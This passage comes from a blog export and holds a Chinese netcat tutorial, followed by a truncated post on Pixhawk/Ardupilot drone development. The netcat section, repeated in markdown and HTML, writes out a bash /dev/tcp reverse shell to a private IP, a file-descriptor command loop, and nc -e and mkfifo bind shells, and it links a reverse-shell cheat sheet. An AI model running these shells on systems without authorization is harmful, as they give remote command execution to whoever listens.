栗子:\n扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．\n## 1. 聊天:\n我先在终端用ssh连接到一台Linux主机，然后键入`nc -l 8888`在远程机器的本地进行监听，然后在本机再开一个终端键入`nc -n 10.128.54.118 8888`即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为\"0.0.0.0\",表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.\n![nc_liaotian](/images/nc_liaotian.png)\n\n## 2.监听和反弹shell(reverse shell)\n先在一台主机shell环境中键入`nc -l -v -p 8888`,然后在另外一台主机中键入`bash -i >& /dev/tcp/10.128.54.118/8888 0>&1`.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在\\*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,`>`后面加上`&`表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流`>`重定向到了网络上，然后后面的`0>&1`表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.\n![Reverse_shell](/images/nc_reverse_shell.png)\n关于反弹shell的代码网络上有很多，比如[这里](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet),囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:\n```bash\n$exec 3<>/dev/tcp/10.128.54.118/8888#创建3号文件描述符绑定到一个读写的网络连接\n$cat <&3 | while read line; do $line >&3 2>&1; done#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．\n```\n\n\n## 3. 连接监听的shell(bind shell)\n在Server端：\n```bash\n$nc -l port -e /bin/bash -i\n```\n在Client端：\n```bash\n$nc server_ip port \n```\n一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:\n```bash\n$mkfifo /tmp/tmp_fifo\n$cat /tmp/tmp_fifo | /bin/bash -i 2>&1 | nc -l port > /tmp/tmp_fifo\n```\n![bind_shell](/images/nc_bind_shell.png)\n\n## 4. 传送文件\n说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．\n\nSender:\n```bash\n$nc -l Port < file\n```\n\nReceiver:\n```bash\n$nc IP Port > file\n```\n![file_send](/images/nc_file_send.png)\n当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．\n\n---\n\n# 3. 总结\n对于\\*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下...\n","slug":"netcat简述","published":1,"updated":"2016-09-02T01:46:19.851Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7qy000or1m1firfo9ue","content":"<p>参考资料:<br><a href=\"http://netcat.sourceforge.net/\" target=\"_blank\" rel=\"external\">http://netcat.sourceforge.net/</a><br><a href=\"http://www.gnucitizen.org/blog/reverse-shell-with-bash/\" target=\"_blank\" rel=\"external\">gnucitizen.org</a><br><a href=\"http://www.oschina.net/translate/linux-netcat-command\" target=\"_blank\" rel=\"external\">http://www.oschina.net/translate/linux-netcat-command</a><br><a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"external\">Reverse shell</a><br><a href=\"https://joncraton.org/blog/46/netcat-for-windows/\" target=\"_blank\" rel=\"external\">NetCat for windows</a></p>\n<hr>\n<h1 id=\"1-nc能干啥？\"><a href=\"#1-nc能干啥？\" class=\"headerlink\" title=\"1. nc能干啥？\"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>\n<hr>\n<h1 id=\"2-栗子\"><a href=\"#2-栗子\" class=\"headerlink\" title=\"2. 栗子:\"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>\n<h2 id=\"1-聊天\"><a href=\"#1-聊天\" class=\"headerlink\" title=\"1. 聊天:\"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src=\"/images/nc_liaotian.png\" alt=\"nc_liaotian\"></p>\n<h2 id=\"2-监听和反弹shell-reverse-shell\"><a href=\"#2-监听和反弹shell-reverse-shell\" class=\"headerlink\" title=\"2.监听和反弹shell(reverse shell)\"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src=\"/images/nc_reverse_shell.png\" alt=\"Reverse_shell\"><br>关于反弹shell的代码网络上有很多，比如<a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\" target=\"_blank\" rel=\"external\">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class=\"comment\">#创建3号文件描述符绑定到一个读写的网络连接</span></div><div class=\"line\"><span class=\"variable\">$cat</span> &lt;&amp;3 | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line; <span class=\"keyword\">do</span> <span class=\"variable\">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class=\"keyword\">done</span><span class=\"comment\">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-连接监听的shell-bind-shell\"><a href=\"#3-连接监听的shell-bind-shell\" class=\"headerlink\" title=\"3. 连接监听的shell(bind shell)\"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> port <span class=\"_\">-e</span> /bin/bash -i</div></pre></td></tr></table></figure></p>\n<p>在Client端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> server_ip port</div></pre></td></tr></table></figure></p>\n<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$mkfifo</span> /tmp/tmp_fifo</div><div class=\"line\"><span class=\"variable\">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc <span class=\"_\">-l</span> port &gt; /tmp/tmp_fifo</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_bind_shell.png\" alt=\"bind_shell\"></p>\n<h2 id=\"4-传送文件\"><a href=\"#4-传送文件\" class=\"headerlink\" title=\"4. 传送文件\"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>\n<p>Sender:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> Port &lt; file</div></pre></td></tr></table></figure></p>\n<p>Receiver:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> IP Port &gt; file</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_file_send.png\" alt=\"file_send\"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>\n<hr>\n<h1 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3. 总结\"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>\n","excerpt":"","more":"<p>参考资料:<br><a href=\"http://netcat.sourceforge.net/\">http://netcat.sourceforge.net/</a><br><a href=\"http://www.gnucitizen.org/blog/reverse-shell-with-bash/\">gnucitizen.org</a><br><a href=\"http://www.oschina.net/translate/linux-netcat-command\">http://www.oschina.net/translate/linux-netcat-command</a><br><a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">Reverse shell</a><br><a href=\"https://joncraton.org/blog/46/netcat-for-windows/\">NetCat for windows</a></p>\n<hr>\n<h1 id=\"1-nc能干啥？\"><a href=\"#1-nc能干啥？\" class=\"headerlink\" title=\"1. nc能干啥？\"></a>1. nc能干啥？</h1><p>能扫描，能聊天，能监听，能反弹，能穿透，能代理，能传文件….<br>netcat被成为网络工具中的瑞士军刀，具体用法可以参考上述链接或者在*nix系统的shell中键入<code>man nc</code>查看手册．这里建议先好好学习一下Linux系统中管道(| &gt; &lt; &gt;&gt; &lt;&lt;等)的用法以及文件描述符的相关知识．</p>\n<hr>\n<h1 id=\"2-栗子\"><a href=\"#2-栗子\" class=\"headerlink\" title=\"2. 栗子:\"></a>2. 栗子:</h1><p>扫描的话就暂时不用nc了，有兴趣的话可以参考nmap这个工具的详细用法．灰常好用，还能输出各种格式的扫描结果并导入数据库．</p>\n<h2 id=\"1-聊天\"><a href=\"#1-聊天\" class=\"headerlink\" title=\"1. 聊天:\"></a>1. 聊天:</h2><p>我先在终端用ssh连接到一台Linux主机，然后键入<code>nc -l 8888</code>在远程机器的本地进行监听，然后在本机再开一个终端键入<code>nc -n 10.128.54.118 8888</code>即可开始聊天.-l参数表示监听，后面8888表示监听网络端口号，这里省略了监听的网卡．默认为”0.0.0.0”,表示所有网络接口．-n参数表示不要将IP地址进行DNS逆向解析到主机名.<br><img src=\"/images/nc_liaotian.png\" alt=\"nc_liaotian\"></p>\n<h2 id=\"2-监听和反弹shell-reverse-shell\"><a href=\"#2-监听和反弹shell-reverse-shell\" class=\"headerlink\" title=\"2.监听和反弹shell(reverse shell)\"></a>2.监听和反弹shell(reverse shell)</h2><p>先在一台主机shell环境中键入<code>nc -l -v -p 8888</code>,然后在另外一台主机中键入<code>bash -i &gt;&amp; /dev/tcp/10.128.54.118/8888 0&gt;&amp;1</code>.Bingo!!!,直接反弹回来一个shell终端.后面指令中的bash -i是启动一个交互式的bash,然后重定向到一个tcp描述符文件，是的，在*nix中，OS的思想是一切都是文件．所以网络连接也是一个文件,<code>&gt;</code>后面加上<code>&amp;</code>表示不是一个简单的文件，而是文件描述符．这属于shell的高级用法，最起码得知道Linux中0,1,2这三个文件描述符默认是对应着标准输入流，标准输出流，标准错误流．而默认对应的真正物理硬件分别是键盘，显示屏和显示屏．因此可以理解为启动了一个交互式bash将标准输出流<code>&gt;</code>重定向到了网络上，然后后面的<code>0&gt;&amp;1</code>表示对于标准输入也重定向到标准输出流，而标准输出流已经输出到了网络上了．所以搞在一起就是全部丢到网络上去．相当于节省了一根管道.<br><img src=\"/images/nc_reverse_shell.png\" alt=\"Reverse_shell\"><br>关于反弹shell的代码网络上有很多，比如<a href=\"http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet\">这里</a>,囊括了包括Bash,Perl,Python,PHP,Ruby,Netcat,Java等，在渗透测试中可能会用到.上述的代码还可以改成下面:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$exec</span> 3&lt;&gt;/dev/tcp/10.128.54.118/8888<span class=\"comment\">#创建3号文件描述符绑定到一个读写的网络连接</span></div><div class=\"line\"><span class=\"variable\">$cat</span> &lt;&amp;3 | <span class=\"keyword\">while</span> <span class=\"built_in\">read</span> line; <span class=\"keyword\">do</span> <span class=\"variable\">$line</span> &gt;&amp;3 2&gt;&amp;1; <span class=\"keyword\">done</span><span class=\"comment\">#cat从3号描述符从读数据然后通过管道丢给while循环，while循环中就读cat的内容并执行，同时将内容重定向到3号描述符，并将错误流也一并回送．</span></div></pre></td></tr></table></figure></p>\n<h2 id=\"3-连接监听的shell-bind-shell\"><a href=\"#3-连接监听的shell-bind-shell\" class=\"headerlink\" title=\"3. 连接监听的shell(bind shell)\"></a>3. 连接监听的shell(bind shell)</h2><p>在Server端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> port <span class=\"_\">-e</span> /bin/bash -i</div></pre></td></tr></table></figure></p>\n<p>在Client端：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> server_ip port</div></pre></td></tr></table></figure></p>\n<p>一般用BSD的netcat不支持-e或者-c参数，所以可以通过建立管道文件来进行读写:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$mkfifo</span> /tmp/tmp_fifo</div><div class=\"line\"><span class=\"variable\">$cat</span> /tmp/tmp_fifo | /bin/bash -i 2&gt;&amp;1 | nc <span class=\"_\">-l</span> port &gt; /tmp/tmp_fifo</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_bind_shell.png\" alt=\"bind_shell\"></p>\n<h2 id=\"4-传送文件\"><a href=\"#4-传送文件\" class=\"headerlink\" title=\"4. 传送文件\"></a>4. 传送文件</h2><p>说实话，在局域网里面传文件还是有些麻烦的．虽然已经有了ftp,smb等协议工具，但是服务端的配置很麻烦．但是有了nc就好了．利用重定向操作，直接实现顶级的文件传送．要传送目录的话可以先用tar等工具压缩和打包，然后再传送，同时支持加解密工具的使用，使得网络窃听者无法对嗅探的流量进行直接地解密．</p>\n<p>Sender:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> <span class=\"_\">-l</span> Port &lt; file</div></pre></td></tr></table></figure></p>\n<p>Receiver:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$nc</span> IP Port &gt; file</div></pre></td></tr></table></figure></p>\n<p><img src=\"/images/nc_file_send.png\" alt=\"file_send\"><br>当然发送者和接受者的重定向也可以反回来使用，都是没问题的．可以多测试一下．如果利用这个小demo再编程做一个文件服务器的应该也可以哦．</p>\n<hr>\n<h1 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3. 总结\"></a>3. 总结</h1><p>对于*nix学习，最好有一本书在手，然后参照命令过一遍，命令很多确实不好记，可以等以后需要的时候再去查，其实用多了就记住了．对于nc这个好的工具目前正好有需求呢所以就学习了一下…</p>\n"},{"title":"无人机学习概况","date":"2016-08-25T05:53:11.000Z","_content":"\n# Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\n\n参考资料:  \n[老吴学长教程:http://www.nephen.com/arrange/archive.html](http://www.nephen.com/arrange/archive.html \"老吴\")\n[Ardupilot:http://ardupilot.org/copter/index.html](http://ardupilot.org/copter/index.html)\n[Pixhawk开发者:http://dev.px4.io/](http://dev.px4.io/)\n\n---\n\n# Pixhawk\n首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是\"悟\"系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王--Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱...其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.\n![梦创的板子](/images/pixhawk.jpg)\n\n# Ardupilot\n这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序**ArduCopter**，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制...可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入`make px4-v2`即可．键入`make px4-v2-upload`即可上载代码．我的开发平台是ubuntu 16.04 amd64.\n![targets](/images/targets.png)\n\n# 交叉编译工具链\n熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了...具体到开发Pixhawk所用到的编译器就是`arm-none-eabi-gcc`家族,详情安装方式参考官网[APM](http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html)或者[PX4](http://dev.px4.io/starting-installing-linux.html)都可以，也可以看我[学长的教程](http://www.nephen.com/2016/01/introduction-to-start-ArduPilot),只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决...最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.\n![arm-none-eabi-gcc](/images/arm-none-eabi-gcc.png)\n\n# 上位机\n一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．\n![APMPlanner](/images/APMPlanner.png)\n\n---\n\n# 总结\n去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．\n","source":"_posts/无人机学习概况.md","raw":"---\ntitle: 无人机学习概况\ndate: 2016-08-25 13:53:11\ncategories: \n- study\n- misc\ntags: \n- C/C++\n- emb\n- uav\n- pixhawk\n---\n\n# Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\n\n参考资料:  \n[老吴学长教程:http://www.nephen.com/arrange/archive.html](http://www.nephen.com/arrange/archive.html \"老吴\")\n[Ardupilot:http://ardupilot.org/copter/index.html](http://ardupilot.org/copter/index.html)\n[Pixhawk开发者:http://dev.px4.io/](http://dev.px4.io/)\n\n---\n\n# Pixhawk\n首先稍微介绍一下Pixhawk,它很贵，是的．国外原装的估计的是700多，国内某宝上有很多公司自己仿照它做的板子也得588.目前据我所知道的某宝上卖的最便宜的Pixhawk是梦创团队做的，由于是手工焊制因此还有待提高其工业水平．不扯淡了，想玩无人机的朋友应该都知道大疆这个公司，目前它的无人机市场占有率很高，详情可以搜一搜相关新闻．大疆也很贵(其实要想玩无人机还是得掏钱啊)，上次我们学校一老师让我们观看一下大疆的一款飞机，好像是\"悟\"系列的，说是从美国带回来的，20000RMB．~__~.所以对于我们一般的爱好者怎么办的？国外开源之王--Pixhawk是首选．硬件开源(为啥能够轻易仿制)，固件开源(降低二次开发难度)，上位机也开源(扩展高级功能)．基本上能够满足无人机平台各个专业的需求．以前它叫做PX4FMU+PX4IO,其实对应到真正的板子上就是一个是stm32f4的芯片，另一个是stm32f1的芯片，主要是它俩加起来搞在一块板子上就是Pixhawk．PX4FMU负责进行高级的浮点运算等，PX4IO负责低级的定时器输出PWM等，两者共同运行了一个叫做Nuttx的嵌入式实时操作系统．如果是买回来的套件，板子肯定已经上载好了bootloader，如果是自己制作，必须在焊接好之后用Jlink等工具首先将bootloader上载进去，而后再通过交叉编译工具链或者上位机用USB接口连接电脑和板子下固件到板子．基础的板子一般只能飞基础的功能，比如自稳模式，定高模式啦．如果要飞高级模式，比如悬停，留待，自动模式啥的得需要GPS或者光流计等可选的硬件设备．所以，还是得舍得花钱...其实说到开源飞控平台有很多，比如国内做得还可以的匿名团队，有兴趣的小伙伴可以去了解一下．下图是梦创的板子.\n![梦创的板子](/images/pixhawk.jpg)\n\n# Ardupilot\n这个是一个固件或者说是软件，相对于一般的用户来说就是固件，因为不去更改它．作为开发者来说就是一个软件平台，必须要进行二次更改或者移植去定制自己的功能．首先要说到APM团队，也是一个无人机开发团队，其实最早是PX4团队在Pixhawk上开发出了固件，然后APM也借助了他们的劳动成果在Pixhawk上加入了自己的一个应用程序**ArduCopter**，这个程序作为一个进程在Nuttx里面被nsh脚本启动．而后再进行各种运算和控制...可能玩过航模的童鞋知道ArduCopter,这玩意儿支持很多架构，不只多旋翼，还包括固定翼和小车等．因为APM团队早期是在基于Avr芯片的arduino板子上跑的软件APM2.x，后来发现低端的资源配置已经不能满足大量的运算了，正巧来了Pixhawk，因此APM团队仍然在完成移植和新功能的开发工作上面．我们为什么不用PX4的固件转而来学习APM的固件呢？答案是简单一些，功能上它们俩差不多，但是在功能的源码实现上不太一样．我们可以分别从各自的github仓库里面fork并clone代码到本地用编辑工具(如sublime等)打开查看就知道了．至于怎么分析代码架构，请先学好单片机等相关知识以及飞行器的基本原理，最好有很好的高数基础和信号滤波的概念．而后，学好C++,就可以开始你的DIY之旅了．如果英文够好的话直接去官网看开发者教程就可以了．下图可以看到ArduCopter也是支持很多硬件平台的，我们编译的时候键入`make px4-v2`即可．键入`make px4-v2-upload`即可上载代码．我的开发平台是ubuntu 16.04 amd64.\n![targets](/images/targets.png)\n\n# 交叉编译工具链\n熟悉嵌入式开发的筒子们肯定都知道，我们在写好代码编译后是需要借助第三方电路结构(例如Jlink,串口有时候也支持)将程序从PC下载到板子上去．这是主要是由于指令集不一样所以要进行交叉编译，除非板子上已经装好了系统了...具体到开发Pixhawk所用到的编译器就是`arm-none-eabi-gcc`家族,详情安装方式参考官网[APM](http://ardupilot.org/dev/docs/building-px4-for-linux-with-make.html)或者[PX4](http://dev.px4.io/starting-installing-linux.html)都可以，也可以看我[学长的教程](http://www.nephen.com/2016/01/introduction-to-start-ArduPilot),只要搭建好这个环境编译APM或者PX4原生固件都是可以的．建议开发平台为Linux，win上面可能会出很多问题，也不建议在win上装Linux虚拟机,因为我当时就出了问题一直木有解决...最好装个双系统啥的．再说，Linux足够安全(相对概念,具体看设计)，不是吗？下图是我的arm-none-eabi-gcc版本号.\n![arm-none-eabi-gcc](/images/arm-none-eabi-gcc.png)\n\n# 上位机\n一款好的飞控开发出来，如果没有易于调参的上位机很是麻烦．Ardupilot里面大大小小的参数百多个，最经典的几个PID参数必须要调的．当然运气好机架和参数恰好对应了就不必这么麻烦了．还有些可选的硬件，在上位机里面修改比取修改源码方便多了．Linux上推荐使用QGC和APMPlanner,QGC和APMPlanner都是基于Qt写出来的上位机，直接支持Linux,Win,Mac．APM Planner而且还可以分析飞控上SD卡的飞行记录数据．而Mission Planner是用.net写出来的，在Linux上的话需要安装mono环境才能跑．对于校准加速度计和磁力计的话MP特别麻烦，转很久可能都转不到某些点．而且这里面的上位机几款都是开源的．有兴趣的都可以研究一下mavlink协议以及图形渲染相关编程技术．下图是APMPlanner的截图．\n![APMPlanner](/images/APMPlanner.png)\n\n---\n\n# 总结\n去年加入的实验室，学stm32f1基础知识，从定时器输出PWM控制电调和定时器输入捕获PWM获取遥控器量，到SPI总线协议收发射频信号，I2C协议获取IMU传感器数据，到基础互补滤波和姿态融合算法，串级PID算法控制PWM输出量．一路走来对飞行器有了基本的认识，今年寒假开始的Pixhawk学习，到近期的电赛结束，算是画上了一个简单的分号吧．感谢各位帮助过我的筒子们，加油吧，学弟学妹们，明年电赛好好干．\n","slug":"无人机学习概况","published":1,"updated":"2016-10-26T11:43:48.942Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciuteb7rq000sr1m1hjshngwj","content":"<h1 id=\"Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\"><a href=\"#Pixhawk-Ardupilot-交叉编译工具链-QGC-AP\" class=\"headerlink\" title=\"Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)\"></a>Pixhawk + Ardupilot + 交叉编译工具链 + QGC(AP)</h1><p>参考资料:<br><a href=\"http://www.nephen.com/arrange/archive.html\" title=\"老吴\" target=\"_blank\" rel=\"external\">老吴学长教程:http://www.nephen.com/arrange/archive.html</a><br><a href=\"http://ardupilot.org/copter/index.html\" target=\"_blank\" rel=\"external\">Ardupilot:http://ardupilot.org/copter/index.html</a><br><a href=\"http://dev.px4.io/\" target=\"_blank\" 